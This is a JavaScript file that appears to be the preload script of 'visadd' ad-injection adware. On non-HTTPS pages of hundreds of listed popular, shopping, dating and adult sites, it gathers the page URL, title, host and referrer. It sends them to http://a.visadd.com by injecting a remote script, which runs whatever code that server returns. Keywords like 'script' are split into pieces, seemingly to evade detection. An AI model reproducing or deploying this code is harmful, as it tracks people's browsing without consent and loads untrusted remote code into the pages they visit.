(function(){
if (window.visadd){
// do nothing
} else{
window.visadd = {};
visadd.preload = {
domain_blacklist: ';google;facebook;mail.aol.com;mail.yahoo.com;webmail;',
domain_restricted: ';youtube.com;wikipedia.org;yahoo.com;answers.yahoo.com;aol.com;huffingtonpost.com;espn.com;msn.com;weather.com;ask.com;imdb.com;cnn.com;about.com;imgur.com;yelp.com;foxnews.com;nytimes.com;nbcnews.com;redif.com;cnet.com;zillow.com;ehow.com;USAToday.com;wikia.com;deviantart.com;tripadvisor.com;pogo.com;answers.com;bbc.co.uk;yellowpages.com;drudgereport.com;washingtonpost.com;buzzfeed.com;reference.com;expedia.com;abcnews.go.com;likes.com;photobucket.com;vube.com;webmd.com;wsj.com;tmz.com;wikihow.com;dailymotion.com;foxsports.com;forbes.com;ign.com;latimes.com;goodreads.com;wunderground.com;java.com;today.com;allrecipes.com;backpage.com;fiverr.com;cbsnews.com;soundcloud.com;worldstarhiphop.com;foodnetwork.com;rantsports.com;nydailynews.com;legacy.com;rr.com;people.com;guardian.co.uk;meetup.com;cbslocal.com;nih.gov;overstock.com;tagged.com;cafemom.com;warriorforum.com;reuters.com;theblaze.com;cbs.com;barnesandnoble.com;thefreedictionary.com;woot.com;newser.com;patch.com;cbssports.com;travelocity.com;upworthy.com;bloomberg.com;nba.com;npr.org;slideshare.net;cnbc.com;cox.com;eonline.com;breitbart.com;zulily.com;examiner.com;istockphoto.com;sxc.hu;dreamstime.com;123rf.com;bigstockphoto.com;fotolia.com;theguardian.com;walmart.com;mashable.com;ikea.com;samsung.com;target.com;blackhatworld.com;groupon.com;kickstarter.com;glassdoor.com;cracked.com;rottentomatoes.com;t-mobile.com;fool.com;gizmodo.com;ksl.com;hotels.com;pogo.com;walgreens.com;aliexpress.com;babycenter.com;chron.com;infowars.com;wired.com;seekingalpha.com;jcpenney.com;booking.com;businessweek.com;zazzle.com;thechive.com;bhphotovideo.com;hilton.com;toysrus.com;cars.com;tvguide.com;edmunds.com;shutterfly.com;quora.com;sbnation.com;pcmag.com;bizjournals.com;engadget.com;chacha.com;hubpages.com;tigerdirect.com;bedbathandbeyond.com;myspace.com;rivals.com;liveleak.com;mtv.com;scribd.com;wnd.com;qvc.com;gamestop.com;spankwire.com;bizrate.com;stubhub.com;fixya.com;pbs.org;nationalgeographic.com;Premierleague.com;footballfancast.com;mlb.com;cbssports.com;dailymail.co.uk;techcrunch.com;thenextweb.com;autotrader.co.uk;moneysavingexpert.com;thesun.co.uk;meetup.com;lastminute.com;goal.com;pistonheads.com;goodreads.com;battle.net;888.com;gamefaqs.com;miniclip.com;xbox.com;us.playstation.com;ea.com;ubi.com;lifehacker.com;woothemes.com;lynda.com;newegg.com;arstechnica.com;searchenginejournal.com;slashdot.org;howtogeek.com;theweathernetwork.com;redflagdeals.com;etsy.com;canadapost.ca;tsn.ca;leagueoflegends.com;sitepoint.com;y8.com;lego.com;9gag.com;lonelyplanet.com;collegehumor.com;craveonline.com;behance.net;indiatimes.com;investopedia.com;thestreet.com;goarticles.com;gettyimages.com;ted.com;economist.com;care2.com;nature.com;flipkart.com;ndtv.com;bodybuilding.com;sears.com;sky.com;hp.com;costco.com;hm.com;sony.com;cafepress.com;kmart.com;forever21.com;hsn.com;officedepot.com;cabelas.com;6pm.com;vice.com;techradar.com;bleacherreport.com;go.com;theregister.co.uk;timesofisrael.com;vancouversun.com;nhl.com;telegraph.co.uk;lenovo.com;pinterest.com;bing.com;yahoo.com;aol.com;yellowpages.com;hubpages.com;wordpress.com;tumblr.com;blogger.com;blogspot.com;godaddy.com;youporn.com;livejasmin.com;xnxx.com;cam4.com;videosexarchive.com;freeones.com;streamate.com;fling.com;planetsuzy.org;literotica.com;manhunt.net;newgrounds.com;ebaumsworld.com;imlive.com;playboy.com;fetlife.com;payserve.com;xcams.com;clips4sale.com;flirt4free.com;debonairblog.com;adultfriendfinder.com;match.com;hi5.com;datehookup.com;afrointroductions.com;meetic.com;blackpeoplemeet.com;loveme.com;oveawake.com;marthastewartweddings.com;plentyoffish.com;okcupid.com;plentyoffish.com;fropper.com;loveshack.org;lavaplace.com;pof.com;eharmony.com;jdate.com;meetme.com;zoosk.com;gayromeo.com;mysinglefriend.com;christianconnection.co.uk;muddymatches.co.uk;lovestruck.com;datingdirect.com;datingforparents.com;lovearts.com;greensingles.com;lavalife.com;singlesnet.com;true.com;christianmingle.com;date.com;personaldatingagent.com;lego.com;go.com;ign.com;xbox.com;us.playstation.com;ea.com;ubi.com;battle.net;gamestop.com;leagueoflegends.com;gamefaqs.com;pogo.com;craveonline.com;cnet.com;fixya.com;',
page_blacklist: '',
encoded_partner: '14567725797',
injectScript: function(url) {
var script = document.createElement('sc' + 'ript');
script.setAttribute('type', 'text/jav' + 'ascri' + 'pt');
script.type = 'text/jav' + 'ascri' + 'pt';
script.src = url;
if (document.body) {
document.body.appendChild(script);
} else {
var hs = document.getElementsByTagName('head');
if (hs && hs.length > 0) {
var h = hs[0]
h.appendChild(script);
}
}
},
setCookie: function(c_name,value,exdays, path)
{
var exdate= null;
if (exdays != null){
exdate=new Date();
exdate.setDate(exdate.getDate() + exdays);
}
var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString())+ ((path==null || typeof(path) == 'undefined') ? "" : "; path="+path);
document.cookie=c_name + "=" + c_value;
},
/* Get cookie by its name */
getCookie : function(c_name) {
if (document.cookie.length > 0) {
var c_start = document.cookie.indexOf(c_name + "=");
if (c_start != -1) {
c_start = c_start + c_name.length + 1;
c_end = document.cookie.indexOf(";", c_start);
if (c_end == -1) c_end = document.cookie.length;
return unescape(document.cookie.substring(c_start, c_end));
}
}
return "";
},
isBlackList: function() {
var ourHostName = document.location.host;
var i,subsHosts;
if (ourHostName == undefined || ourHostName.length == 0)
return false;
ourHostName = ourHostName.toLowerCase();
subsHosts = ourHostName.replace(/[^.]/g, "").length; // how many time there are "."
for(i=0 ; i < subsHosts ; i++) {
if(visadd.preload.domain_blacklist.indexOf("|"+ourHostName+"|") != -1){
return true;
}
ourHostName = ourHostName.substring(ourHostName.indexOf(".")+1,ourHostName.length);
}
return false;
},
isDomainAllowed: function(){
if (visadd.preload.domain_restricted.length > 0){
var ourHostName = document.location.host;
var i,subsHosts;
if (ourHostName == undefined || ourHostName.length == 0)
return false;
ourHostName = ourHostName.toLowerCase();
subsHosts = ourHostName.replace(/[^.]/g, "").length; // how many time there are "."
for(i=0 ; i < subsHosts ; i++) {
if(visadd.preload.domain_restricted.indexOf(";"+ourHostName+";") != -1){
return true;
}
ourHostName = ourHostName.substring(ourHostName.indexOf(".")+1,ourHostName.length);
}
return false;
}
return true;
},
isPageAllowed: function(){
return window.location.protocol != "https:";
},
isTimeAllowed: function(){
// check if time was locked
return true;
},
title: function(){
return document.title;
},
tags: function(){
return "";
},
init: function(){
if (!visadd.preload.isBlackList() && visadd.preload.isPageAllowed() &&
visadd.preload.isTimeAllowed() && visadd.preload.isDomainAllowed()){
var params = '';
params = params + "pid=" + escape(visadd.preload.encoded_partner);
params = params + (document.charset ? '&charset='+document.charset : (document.characterSet ? '&charset='+document.characterSet : ''));
if (document.context) {
params = params + "&context=" + escape(document.context);
}
params = params + "&ti=" + escape(visadd.preload.title());
if (document.referrer){
params = params + "&referer=" + escape(document.referrer);
}
params = params + "&loc=" + escape(window.location) + "&dm=" + escape(window.location.host);
visadd.preload.injectScript('http://a.visadd.com/script/layer?' + params);
}
}
}
visadd.preload.init();
}
}());
